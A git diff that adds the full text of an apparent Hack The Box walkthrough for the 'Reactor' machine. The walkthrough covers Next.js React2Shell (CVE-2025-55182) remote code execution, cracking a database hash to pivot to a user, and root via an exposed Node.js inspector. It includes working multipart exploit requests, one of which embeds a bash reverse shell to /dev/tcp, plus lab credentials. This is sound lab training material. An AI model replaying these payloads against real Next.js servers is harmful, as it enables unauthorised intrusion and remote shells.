@@ -1,7 +1,7 @@
 ---
 title: "Reactor"
-date: "2026-07-31"
-summary: "Walkthrough for Reactor on Hack The Box, release after machine retirement"
+date: "2026-11-24"
+summary: "Next.js React2Shell grants a shell as node, a cracked database hash pivots to engineer, and an exposed Node.js inspector escalates to root."
 platform: "htb"
 machineName: "Reactor"
 difficulty: "easy"
@@ -66,4 +66,127 @@ SF:175\r\nDate:\x20Fri,\x2031\x20Jul\x202026\x2004:30:36\x20GMT\r\nConnect
 
 The Nmap scan shows two ports open on the target machine:- Ports 22 and 3000
 
-*This box is still active on HackTheBox. Once retired, this writeup will be published for public access as per HackTheBox's policy on publishing content from their platform*
+22 is running an SSH service
+
+3000 is hosting a web-server
+
+### Enumerating Port 3000
+
+Browsing to port 3000 on the browser leads us to the following page:-
+
+![image.png](./img/Reactor/image.png)
+
+There appears no other pages listed/linked to from this homepage. 
+
+### Next.js 15.0.3
+
+The tester tried a lot of fuzzing:- for directories, endpoints, parameters etc. Nothing was fruitful
+
+While inspecting one of the webpage’s requests in Burp, the tester observed that the it uses `Next.js` .
+
+The tester installed Wappalyzer extension and check the technologies used, and sure enough, Next.js was used. And the version:- `15.0.3`
+
+# **CVE-2025-55182**
+
+Googling for “next js 15.0.3 vulnerabilities" gives a lot of different CVEs.
+
+![image.png](./img/Reactor/image%201.png)
+
+One vulnerability looks particularly interesting:- 
+
+https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/
+
+`CVE-2025-55182` , also known as “React2Shell” is a critical RCE vulnerability affecting React Server Components in Next.js applications.
+
+Searching for PoCs led the tester to OffSec’s blog about this vulnerability:- [https://www.offsec.com/blog/cve-2025-55182/](https://www.offsec.com/blog/cve-2025-55182/)
+
+PoC code for the same was present:-
+
+```jsx
+POST / HTTP/1.1
+Host: 192.168.120.206
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
+Next-Action: x
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad
+Content-Length: 467
+
+------WebKitFormBoundaryx8jO2oVc6SWP3Sad
+Content-Disposition: form-data; name="0"
+
+{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"process.mainModule.require('child_process').execSync('touch /tmp/rce_poc');","_formData":{"get":"$1:constructor:constructor"}}}
+------WebKitFormBoundaryx8jO2oVc6SWP3Sad
+Content-Disposition: form-data; name="1"
+
+"$@0"
+------WebKitFormBoundaryx8jO2oVc6SWP3Sad--
+
+```
+
+The tester tinkered the above payload to make the server connect back to a `netcat` listener on the tester’s machine through a revshell payload so:-
+
+```jsx
+POST / HTTP/1.1
+Host: 192.168.120.206
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
+Next-Action: x
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad
+Content-Length: 508
+
+------WebKitFormBoundaryx8jO2oVc6SWP3Sad
+Content-Disposition: form-data; name="0"
+
+{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"process.mainModule.require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/<IP>/6522 0>&1\"');","_formData":{"get":"$1:constructor:constructor"}}}
+------WebKitFormBoundaryx8jO2oVc6SWP3Sad
+Content-Disposition: form-data; name="1"
+
+"$@0"
+------WebKitFormBoundaryx8jO2oVc6SWP3Sad--
+```
+
+And I got a shell as the user `node`:-
+
+![image.png](./img/Reactor/image%202.png)
+
+# Discovery of Credentials and user flag
+
+![image.png](./img/Reactor/image%203.png)
+
+There is a file named `reactor.db` present, which contains user credentials. One username `engineer` had the password hash `39d97110eafe2a9a68639812cd271e8e`
+
+Using [https://crackstation.net/](https://crackstation.net/) to crack the hash, and the tester got the credentials `engineer:reactor1`
+
+Using the obtained credentials, the tester logged in as `engineer` and claimed the user flag:-
+
+![image.png](./img/Reactor/image%204.png)
+
+# Privilege Escalation
+
+The tester tried out few basic privilege escalation checks, but nothing was fruitful
+
+Then the tester ran `ps aux`  to check for running processes, and something looked interesting:-
+
+![image.png](./img/Reactor/image%205.png)
+
+There is a `Node.js` process running as `root` with Node’s inspector enabled.
+
+## Node.js Inspector Process
+
+From the `ps aux` output the tester determined the `Node.js` process is running on [localhost](http://localhost) on port 9229.
+
+The tester then checked if they can connect to the debugger using `node`:-
+
+```bash
+engineer@reactor:~$ node inspect localhost:9229
+connecting to localhost:9229 ... ok
+debug> 
+```
+
+The tester then checked if code execution is possible:-
+
+```bash
+debug> exec("process.mainModule.require('child_process').execSync('id').toString()")
+'uid=0(root) gid=0(root) groups=0(root)\n'
+
+```
+
+The tester has achieved privilege escalation through a `node` process running in the `root` user context, and then proceeded to exfiltrate the root flag.
